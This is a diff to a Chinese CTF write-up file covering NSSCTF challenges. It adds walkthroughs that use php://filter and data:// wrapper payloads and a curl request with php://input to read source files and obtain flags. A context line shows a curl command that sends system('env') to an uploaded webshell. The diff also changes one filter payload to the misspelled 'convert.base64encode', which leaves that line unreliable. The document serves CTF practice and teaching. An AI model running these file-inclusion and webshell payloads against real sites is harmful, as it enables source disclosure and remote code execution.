@@ -32,7 +32,7 @@ php伪协议：php://filter会对数据流进行过滤和处理
 playload：
 
 ```
-/?file=php://filter/read/convert.base64_encode/resource=flag.php
+/?file=php://filter/read/convert.base64encode/resource=flag.php
 ```
 
 5:[SWPUCTF 2021 新生赛]easy_sql
@@ -469,7 +469,6 @@ curl -X POST -d "cmd=system('env');"http://node7.anna.nssctf.cn:27834/upload/one
 * **跳过 `__wakeup`** ：为了防止潜在的不安全操作，PHP 会直接跳过 `__wakeup` 的执行。
 * **忽略多余属性** ：多余的属性（如第 3 个属性）在反序列化时会被忽略，但对象仍会被创建。
 
-
 __weakup（）函数的作用：
 
 `__wakeup()` 是 PHP 中的一个魔术方法（Magic Method），它 **在对象反序列化（`unserialize()`）时自动调用** ，主要用于在反序列化后对对象进行初始化或恢复某些状态。以下是其核心作用和应用场景：
@@ -489,3 +488,63 @@ __weakup（）函数的作用：
   `__wakeup()` 仅在以下情况下触发：
 * 通过 `unserialize()` 反序列化对象时。
 * 序列化字符串中声明的属性数量 **严格等于** 类实际定义的属性数量（否则会被跳过，如你提到的绕过场景）。
+
+14.[SWPUCTF 2021 新生赛]PseudoProtocols
+
+查看这道题目，发现需要考查php伪协议
+
+进入题目发现
+
+hint is hear Can you find out the hint.php?
+
+要让我们查看hint.php,尝试访问发现可以访问成功但是显示的是空白页面，可能是被屏蔽了
+
+url中貌似提醒我们要尝试用php://filter伪协议进行访问
+
+```
+/?wllm=php://filter/read/convert.base64-encode/resource=hint.php
+```
+
+![1744338021919](image/NSS/1744338021919.png)
+
+用base64解码查看，发现是
+
+![1744338083944](image/NSS/1744338083944.png)
+
+尝试访问/test2222222222222.php
+
+![1744338149396](image/NSS/1744338149396.png)
+
+发现可以使用get方法上传a并使得a严格=i want flag
+
+有两种方法
+
+```
+/?a=data://text/plain,I want flag
+```
+
+data://text/plain指定MIME类型为纯文本
+
+或者直接利用命令行来访问
+
+```
+curl -X POST -d "I want flag" http://node7.anna.nssctf.cn:29262/test2222222222222.php/?a=php://input
+```
+
+`php://input`是一个只读流，用于读取原始的请求数据。它通常用于接收POST请求的内容，尤其是在处理非文件上传的POST数据时。
+
+得到flag
+
+![1744339157025](image/NSS/1744339157025.png)
+
+15.[NCTF 2018]签到题
+
+bp抓包
+
+![1744340740346](image/NSS/1744340740346.png)
+
+添加cookie并修改url得到flag
+
+在url中删除secret.php
+
+![1744340810230](image/NSS/1744340810230.png)
